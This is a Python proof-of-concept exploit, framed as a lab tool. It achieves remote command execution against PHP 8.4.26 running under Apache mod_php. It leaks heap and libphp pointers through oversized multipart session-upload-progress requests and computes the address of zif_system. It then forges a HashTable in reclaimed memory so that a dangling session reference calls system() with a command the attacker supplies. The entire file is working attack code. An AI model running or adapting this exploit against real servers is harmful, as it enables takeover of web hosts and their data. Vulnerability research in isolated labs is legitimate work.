#!/usr/bin/env python3
"""One-command PHP 8.4.26 php2shell lab exploit.

Target requirements:
  * PHP 8.4.26 mod_php, Apache 2.4.68 prefork, one worker
  * NTS build and the symbol offsets documented in README.md
  * display_errors=On, memory_limit=8M, post_max_size>=24M
  * session.upload_progress.enabled=On
  * a proof directory mounted at /out in the target container

The attack itself is plain multipart HTTP.  Success is reported only after the
requested proof file exists and is non-empty.

Usage:
  python3 poc.py http://127.0.0.1:8088/index.php
  python3 poc.py URL --cmd 'id>/out/p1' --proof-file ./out/p1
"""

from __future__ import annotations

import argparse
import os
import re
import socket
import struct
import sys
import time
import urllib.parse
from collections import Counter


DEFAULT_CMD = "id>/out/p1"
DEFAULT_PROOF = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "out", "p1")
)

# Measured against php:8.4.26-apache's libphp.so in the supplied Apache 2.4.68
# image.  The leaked HashTable pDestructor pointer and zif_system differ by
# this fixed, ASLR-independent amount.
DTOR_TO_ZIF = -0x1F97F0
HTDATA_OFFSET = 0x7E0D8
MAX_CMD = 14


def multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        name = part["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename"):
            out += b'; filename="' + part["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


class Target:
    def __init__(self, url: str, timeout: float = 45.0):
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("URL must use http:// or https://")
        self.https = parsed.scheme == "https"
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if self.https else 80)
        self.path = parsed.path or "/"
        self.timeout = timeout

    def post(
        self,
        body: bytes,
        boundary: bytes,
        read_cap: int = 9 << 20,
        timeout: float | None = None,
    ) -> bytes:
        header = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        sock = socket.create_connection(
            (self.host, self.port), timeout=timeout or self.timeout
        )
        sock.settimeout(timeout or self.timeout)
        data = bytearray()
        try:
            try:
                sock.sendall(header)
                view = memoryview(body)
                for offset in range(0, len(body), 262144):
                    sock.sendall(view[offset : offset + 262144])
            except OSError:
                pass
            try:
                while len(data) < read_cap:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
            return bytes(data)
        finally:
            sock.close()


def parse_cookie(response: bytes) -> bytes:
    match = re.search(
        rb"Set-Cookie:\s*PHPSESSID=([^\r\n]*?);\s*path=/",
        response,
        re.IGNORECASE,
    )
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def leak_addresses(
    target: Target,
    dtor_to_zif: int = DTOR_TO_ZIF,
) -> tuple[int, int, int]:
    print("[*] leak: request A")
    parts = [
        {"name": f"p{i:04d}", "data": b"x"} for i in range(1001)
    ]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    target.post(multipart(parts, b"S" * 17), b"S" * 17)
    time.sleep(1.0)

    print("[*] leak: request B")
    parts = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        value = ((f"v{i:04d}") + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": value.encode()})

    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x80000)
    forge[0x18] = ord("L")
    parts.append({"name": "999990", "data": bytes(forge)})
    for i in range(150):
        parts.append({"name": f"z{i:03d}[0]", "data": b"x"})

    response = target.post(multipart(parts, b"B" * 10), b"B" * 10)
    # The leak response can arrive before the single worker has fully unwound
    # the OOM/cleanup path. Let it reach the next accept before arming fire-A.
    time.sleep(5.0)
    cookie = parse_cookie(response)
    if len(cookie) < 4096:
        raise RuntimeError(
            f"heap leak missed: decoded cookie is only {len(cookie)} bytes"
        )

    bases: Counter[int] = Counter()
    for offset in range(len(cookie) - 7):
        ptr = int.from_bytes(cookie[offset : offset + 8], "little")
        if 0x7F0000000000 <= ptr < 0x800000000000:
            bases[ptr & ~0x1FFFFF] += 1
    if not bases:
        raise RuntimeError("heap leak contained no canonical user pointers")
    chunk, chunk_votes = bases.most_common(1)[0]
    if chunk_votes < 100:
        raise RuntimeError("heap leak did not contain enough repeated pointers")

    gc_array = b"\x01\x00\x00\x00\x07\x00\x00\x00"
    code_ptrs: Counter[int] = Counter()
    offset = 0
    while True:
        offset = cookie.find(gc_array, offset)
        if offset < 0:
            break
        if offset + 56 <= len(cookie):
            ptr = int.from_bytes(cookie[offset + 48 : offset + 56], "little")
            if 0x7F0000000000 <= ptr < 0x800000000000:
                code_ptrs[ptr] += 1
        offset += 1
    if not code_ptrs:
        raise RuntimeError("libphp HashTable pDestructor pointer was not leaked")
    destructor, destructor_votes = code_ptrs.most_common(1)[0]
    if destructor_votes < 10:
        raise RuntimeError("libphp pointer leak was not repeated enough")

    zif_system = destructor + dtor_to_zif
    htdata = chunk + HTDATA_OFFSET
    print(
        f"[+] chunk={chunk:#x} ({chunk_votes} votes) "
        f"dtor={destructor:#x} ({destructor_votes} votes)"
    )
    print(f"[+] HTDATA={htdata:#x} zif_system={zif_system:#x}")
    return chunk, htdata, zif_system


def build_fake_ht(cmd: bytes, htdata: int, zif_system: int) -> bytes:
    if len(cmd) > MAX_CMD:
        raise ValueError(f"command is limited to {MAX_CMD} bytes")
    ht = bytearray(167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_system)
    execute_data = 0x20
    struct.pack_into("<Q", ht, execute_data + 0x10, zif_system)
    struct.pack_into("<I", ht, execute_data + 0x2C, 1)
    struct.pack_into("<Q", ht, execute_data + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, execute_data + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98 : 0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def build_live_reference(htdata: int) -> bytes:
    value = bytearray(b"R" * 31)
    struct.pack_into("<Q", value, 0x00, (10 << 32) | 1)
    struct.pack_into("<Q", value, 0x08, htdata)
    struct.pack_into("<I", value, 0x10, 0x307)
    struct.pack_into("<I", value, 0x14, 0)
    return bytes(value)


def fire(target: Target, htdata: int, zif_system: int, cmd: bytes) -> None:
    print("[*] fire: request A (dangling session reference)")
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 100},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    # Seven-byte names are part of the calibrated bin-56 layout.
    parts += [{"name": f"p{i:06d}", "data": b"V"} for i in range(80)]
    parts += [
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (24 * 1024 * 1024)},
    ]
    target.post(
        multipart(parts, b"S" * 17),
        b"S" * 17,
        read_cap=1 << 20,
        timeout=90,
    )
    time.sleep(3.0)

    print("[*] fire: request B (reclaim reference and call zif_system)")
    fake_ht = build_fake_ht(cmd, htdata, zif_system)
    live_reference = build_live_reference(htdata)
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 100},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    parts += [
        {"name": f"m{i:04d}", "data": b"M" * 100} for i in range(8)
    ]
    parts += [
        {"name": (f"F{i:030d}")[:31], "data": b"z"} for i in range(80)
    ]
    parts += [
        {"name": f"r{i:04d}", "data": live_reference} for i in range(200)
    ]
    parts.append({"name": ("a" + "0" * 30)[:31], "data": fake_ht})
    target.post(
        multipart(parts, b"B" * 10),
        b"B" * 10,
        read_cap=65536,
        timeout=30,
    )


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="PHP target URL, e.g. http://localhost:8088/index.php")
    parser.add_argument("--cmd", default=DEFAULT_CMD)
    parser.add_argument("--proof-file", default=DEFAULT_PROOF)
    parser.add_argument("--timeout", type=float, default=45.0)
    parser.add_argument(
        "--dtor-to-zif-delta",
        type=lambda value: int(value, 0),
        default=DTOR_TO_ZIF,
        help="calibrated leaked-pDestructor-to-zif_system delta",
    )
    args = parser.parse_args()

    cmd = args.cmd.encode()
    if len(cmd) > MAX_CMD:
        parser.error(f"--cmd is limited to {MAX_CMD} bytes")
    try:
        if args.proof_file and os.path.exists(args.proof_file):
            os.unlink(args.proof_file)
    except OSError:
        pass

    target = Target(args.url, args.timeout)
    try:
        chunk, htdata, zif_system = leak_addresses(
            target, args.dtor_to_zif_delta
        )
        fire(target, htdata, zif_system, cmd)
    except Exception as exc:
        print(f"[-] exploit failed during request chain: {exc}", file=sys.stderr)
        return 1

    time.sleep(1.5)
    if args.proof_file:
        try:
            proof = open(args.proof_file, "r", encoding="utf-8").read().strip()
        except OSError:
            proof = ""
        if proof:
            print(f"PROOF: {proof}")
            print(f"[+] chunk base: {chunk:#x}")
            return 0
    print(
        "[-] no proof file: the worker may have crashed, but command execution "
        "is not confirmed",
        file=sys.stderr,
    )
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
